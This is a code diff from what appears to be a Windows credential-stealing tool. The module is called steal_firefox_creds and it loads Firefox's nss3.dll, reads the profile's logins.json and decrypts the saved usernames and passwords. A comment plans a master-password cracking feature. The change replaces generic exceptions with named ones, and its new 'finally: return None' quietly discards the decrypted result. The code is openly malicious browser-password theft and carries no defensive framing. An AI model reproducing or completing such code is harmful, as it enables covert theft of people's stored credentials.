@@ -2,12 +2,11 @@ import os
 from base64 import b64decode
 from ctypes import CDLL, POINTER, c_void_p
 from string import ascii_uppercase
-from classes.firefox import MyException, SECItem, PK11SlotInfo
+from classes.firefox import NSS3NotFoundError, NSS3KeySlotCreationError, MasterPasswordDetected, SECItem, PK11SlotInfo
 import json
 
 
 __FIREFOX_PROFILES_ROOT = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles"%(os.environ['USERPROFILE']))
-__FIREFOX_KEY4DB_FILE = "key4.db" # will be used in the future
 __FIREFOX_LOGINSJSON_FILE = "logins.json"
 __NSS3_DLL = "nss3.dll"
 
@@ -37,7 +36,7 @@ def __load_nss3_dll_libarary():
     nss3_dll_libarary_path = __search_nss3_dll_libarary_path()
     if nss3_dll_libarary_path:
         return CDLL(nss3_dll_libarary_path)
-    raise MyException("nss3.dll was not found in the firefox installation folder")
+    raise NSS3NotFoundError("nss3.dll was not found in the firefox installation folder")
 
 
 def __set_nss3_attr_and_res(nss3):
@@ -110,14 +109,24 @@ def __decrypt_firefox_creds(nss3, logins):
 
             return cracked_logins
         else:
-            raise MyException("Master password detected, need to implement crack feature") # TODO: create a master password crack feature
+            raise MasterPasswordDetected("Master password detected, need to implement crack feature")
     else:
-        raise MyException("Couldn't create nss3 keyslot")
+        raise NSS3KeySlotCreationError("Couldn't create nss3 keyslot")
 
 
 def steal_firefox_creds(): # get firefox credentials
-    nss3 = __load_nss3_dll_libarary()
-    __nss3_init(nss3)
-    __set_nss3_attr_and_res(nss3)
-    logins = __get_logins_from_loginsjson_file()
-    return __decrypt_firefox_creds(nss3, logins)
+    try:
+        nss3 = __load_nss3_dll_libarary()
+        __nss3_init(nss3)
+        __set_nss3_attr_and_res(nss3)
+        logins = __get_logins_from_loginsjson_file()
+        return __decrypt_firefox_creds(nss3, logins)
+    except NSS3NotFoundError:
+        print("NSS3 dll was not found")
+    except NSS3KeySlotCreationError:
+        print("NSS3 coudln't create a key slot")
+    except MasterPasswordDetected:
+        print("Master password detected, can't extract creds")
+    finally:
+        return None
+
